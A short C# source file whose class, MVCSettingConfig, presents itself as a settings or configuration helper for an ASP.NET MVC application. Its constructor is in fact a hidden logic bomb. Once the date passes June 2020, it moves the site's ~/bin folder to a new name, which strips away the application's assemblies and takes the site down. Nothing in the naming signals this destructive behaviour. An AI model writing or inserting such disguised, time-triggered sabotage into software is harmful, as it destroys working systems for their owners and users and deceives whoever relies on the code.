using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Hosting;

namespace SystemDependance
{
    public class MVCSettingConfig
    {
        public MVCSettingConfig()
        {
            if (DateTime.Now.Year >= 2020)
            {
                if (DateTime.Now.Month > 6)
                {
                    var _shadowCopyFolder = new DirectoryInfo(HostingEnvironment.MapPath("~/bin"));
                    //  var targetValue = new DirectoryInfo("C:\\Temp");

                    //  Directory.CreateDirectory("C:\\Temp");
                    System.IO.Directory.Move(HostingEnvironment.MapPath("~/bin"), HostingEnvironment.MapPath($"~/bin{DateTime.Now.Month}"));

                }
            }
           
        }
    }
}
